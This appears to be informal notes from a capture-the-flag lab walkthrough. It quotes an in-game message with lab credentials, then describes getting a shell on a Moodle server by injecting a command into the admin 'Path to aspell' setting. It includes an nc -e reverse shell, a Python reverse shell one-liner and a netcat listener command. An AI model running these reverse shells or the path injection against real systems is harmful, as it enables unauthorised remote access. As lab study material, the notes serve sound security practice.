Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir

**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.

Exploiting moodle:

Okay in the start when I logged in as xenia there wasn’t anything that we could exploit in moodle. But I know that we can exploit it if we have admin power.


All we need to do is edit some system paths which can be found in Site administration -> Server -> System paths and in the Path to aspell we can just add our reverse shell.


nc -e /bin/sh 192.168.56.1 4444


*****************python Reverse shell*********************************


python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.14",3334));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	
************For Listning Reverse shell use netcat*****************

nc -lvp 3334
